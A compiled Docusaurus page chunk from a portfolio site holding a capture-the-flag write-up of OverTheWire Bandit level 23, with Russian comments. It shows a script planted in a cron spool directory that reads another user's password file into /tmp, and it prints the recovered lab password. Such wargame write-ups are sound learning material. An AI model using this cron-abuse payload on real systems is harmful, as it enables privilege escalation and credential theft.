"use strict";(globalThis.webpackChunkmy_portfolio=globalThis.webpackChunkmy_portfolio||[]).push([[3416],{4212(n,e,i){i.r(e),i.d(e,{assets:()=>p,contentTitle:()=>c,default:()=>a,frontMatter:()=>s,metadata:()=>t,toc:()=>l});const t=JSON.parse('{"id":"write-up/bandit/fix/Level 23","title":"Bandit Level 23","description":"bandit23@bandit:\\\\~\\\\$ cd /../../bin","source":"@site/docs/write-up/bandit/fix/Level 23.md","sourceDirName":"write-up/bandit/fix","slug":"/write-up/bandit/fix/Level 23","permalink":"/portfolio/docs/write-up/bandit/fix/Level 23","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Bandit Level 22","permalink":"/portfolio/docs/write-up/bandit/fix/Level 22"},"next":{"title":"Bandit Level 24","permalink":"/portfolio/docs/write-up/bandit/fix/Level 24"}}');var d=i(4848),r=i(8453);const s={},c="Bandit Level 23",p={},l=[];function o(n){const e={h1:"h1",header:"header",p:"p",...(0,r.R)(),...n.components};return(0,d.jsxs)(d.Fragment,{children:[(0,d.jsx)(e.header,{children:(0,d.jsx)(e.h1,{id:"bandit-level-23",children:"Bandit Level 23"})}),"\n",(0,d.jsx)(e.p,{children:"bandit23@bandit:~$ cd /../../bin"}),"\n",(0,d.jsx)(e.p,{children:'bandit23@bandit:/bin$ ls | grep "cron"'}),"\n",(0,d.jsx)(e.p,{children:"cronjob_bandit22.sh"}),"\n",(0,d.jsx)(e.p,{children:"cronjob_bandit23.sh"}),"\n",(0,d.jsx)(e.p,{children:"cronjob_bandit24.sh"}),"\n",(0,d.jsx)(e.p,{children:"cronjob_behemoth4"}),"\n",(0,d.jsx)(e.p,{children:"cronjob_leviathan5"}),"\n",(0,d.jsx)(e.p,{children:"crontab"}),"\n",(0,d.jsx)(e.p,{children:"bandit23@bandit:/bin$ cat cronjob_bandit24.sh"}),"\n",(0,d.jsx)(e.p,{children:"#!/bin/bash"}),"\n",(0,d.jsx)(e.p,{children:"\xa0"}),"\n",(0,d.jsx)(e.p,{children:"myname=$(whoami)"}),"\n",(0,d.jsx)(e.p,{children:"\xa0"}),"\n",(0,d.jsx)(e.p,{children:"cd /var/spool/$myname/foo"}),"\n",(0,d.jsx)(e.p,{children:'echo "Executing and deleting all scripts in /var/spool/$myname/foo:"'}),"\n",(0,d.jsx)(e.p,{children:"for i in * .*;"}),"\n",(0,d.jsx)(e.p,{children:"do"}),"\n",(0,d.jsx)(e.p,{children:'if [ "$i" != "." -a "$i" != ".." ];'}),"\n",(0,d.jsx)(e.p,{children:"then"}),"\n",(0,d.jsx)(e.p,{children:'echo "Handling $i"'}),"\n",(0,d.jsx)(e.p,{children:'owner="$(stat --format "%U" ./$i)"'}),"\n",(0,d.jsx)(e.p,{children:'if [ "${owner}" = "bandit23" ]; then'}),"\n",(0,d.jsx)(e.p,{children:"timeout -s 9 60 ./$i"}),"\n",(0,d.jsx)(e.p,{children:"fi"}),"\n",(0,d.jsx)(e.p,{children:"rm -f ./$i"}),"\n",(0,d.jsx)(e.p,{children:"fi"}),"\n",(0,d.jsx)(e.p,{children:"done"}),"\n",(0,d.jsx)(e.p,{children:"\xa0"}),"\n",(0,d.jsx)(e.p,{children:"bandit23@bandit:/bin$"}),"\n",(0,d.jsx)(e.p,{children:'bandit23@bandit:~$ OUT="/tmp/p24.$RANDOM"'}),"\n",(0,d.jsx)(e.p,{children:'echo "$OUT"'}),"\n",(0,d.jsx)(e.p,{children:"/tmp/p24.10015"}),"\n",(0,d.jsx)(e.p,{children:"bandit23@bandit:~$ cat &gt; /tmp/p.sh &lt;&lt;'EOF'"}),"\n",(0,d.jsx)(e.p,{children:"&gt; cat /etc/bandit_pass/bandit24 &gt; __OUT__"}),"\n",(0,d.jsx)(e.p,{children:"chmod 644 __OUT__"}),"\n",(0,d.jsx)(e.p,{children:"EOF"}),"\n",(0,d.jsx)(e.p,{children:'sed -i "s#__OUT__#$OUT#g" /tmp/p.sh'}),"\n",(0,d.jsx)(e.p,{children:"chmod 755 /tmp/p.sh"}),"\n",(0,d.jsx)(e.p,{children:"bandit23@bandit:~$ cp -f /tmp/p.sh /var/spool/bandit24/foo/.z.sh"}),"\n",(0,d.jsx)(e.p,{children:"bandit23@bandit:~$ sleep 75"}),"\n",(0,d.jsx)(e.p,{children:'cat "$OUT"'}),"\n",(0,d.jsx)(e.p,{children:"[gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8]{.mark}"}),"\n",(0,d.jsx)(e.p,{children:"bandit23@bandit:~$"}),"\n",(0,d.jsx)(e.p,{children:"\u043f\u043e\u044f\u0441\u043d\u0435\u043d\u0438\u0435"}),"\n",(0,d.jsx)(e.p,{children:"# 1) \u041a\u0443\u0434\u0430 \u043f\u0438\u0441\u0430\u0442\u044c \u043f\u0430\u0440\u043e\u043b\u044c (\u0432 \u043a\u043e\u0440\u0435\u043d\u044c /tmp, \u043e\u043d 1777, \u0432\u0441\u0435\u043c \u0434\u043e\u0441\u0442\u0443\u043f\u0435\u043d)"}),"\n",(0,d.jsx)(e.p,{children:'OUT="/tmp/p24.$RANDOM"'}),"\n",(0,d.jsx)(e.p,{children:'echo "$OUT"'}),"\n",(0,d.jsx)(e.p,{children:"\xa0"}),"\n",(0,d.jsx)(e.p,{children:"# 2) \u0441\u043e\u0431\u0438\u0440\u0430\u0435\u043c payload \u0437\u0430\u0440\u0430\u043d\u0435\u0435 \u0441\u043e shebang"}),"\n",(0,d.jsx)(e.p,{children:"cat &gt; /tmp/p.sh &lt;&lt;'EOF'"}),"\n",(0,d.jsx)(e.p,{children:"#!/bin/bash"}),"\n",(0,d.jsx)(e.p,{children:"cat /etc/bandit_pass/bandit24 &gt; __OUT__"}),"\n",(0,d.jsx)(e.p,{children:"chmod 644 __OUT__"}),"\n",(0,d.jsx)(e.p,{children:"EOF"}),"\n",(0,d.jsx)(e.p,{children:'sed -i "s#__OUT__#$OUT#g" /tmp/p.sh'}),"\n",(0,d.jsx)(e.p,{children:"chmod 755 /tmp/p.sh"}),"\n",(0,d.jsx)(e.p,{children:"\xa0"}),"\n",(0,d.jsx)(e.p,{children:"# 3) \u043a\u043e\u043f\u0438\u0440\u0443\u0435\u043c \u0433\u043e\u0442\u043e\u0432\u044b\u0439 \u0444\u0430\u0439\u043b \u0432 \u043e\u0447\u0435\u0440\u0435\u0434\u044c, \u0433\u0434\u0435 \u0435\u0433\u043e \u043f\u043e\u0434\u0431\u0435\u0440\u0451\u0442 cron (\u0432\u043b\u0430\u0434\u0435\u043b\u0435\u0446 \u0441\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u0441\u044f bandit23)"}),"\n",(0,d.jsx)(e.p,{children:"cp -f /tmp/p.sh /var/spool/bandit24/foo/.z.sh"}),"\n",(0,d.jsx)(e.p,{children:"\xa0"}),"\n",(0,d.jsx)(e.p,{children:"# 4) \u0436\u0434\u0435\u043c, \u043f\u043e\u043a\u0430 cron \u043e\u0442\u0440\u0430\u0431\u043e\u0442\u0430\u0435\u0442, \u0438 \u0447\u0438\u0442\u0430\u0435\u043c \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442"}),"\n",(0,d.jsx)(e.p,{children:"sleep 75"}),"\n",(0,d.jsx)(e.p,{children:'cat "$OUT"'})]})}function a(n={}){const{wrapper:e}={...(0,r.R)(),...n.components};return e?(0,d.jsx)(e,{...n,children:(0,d.jsx)(o,{...n})}):o(n)}},8453(n,e,i){i.d(e,{R:()=>s,x:()=>c});var t=i(6540);const d={},r=t.createContext(d);function s(n){const e=t.useContext(r);return t.useMemo(function(){return"function"==typeof n?n(e):{...e,...n}},[e,n])}function c(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(d):n.components||d:s(n.components),t.createElement(r.Provider,{value:e},n.children)}}}]);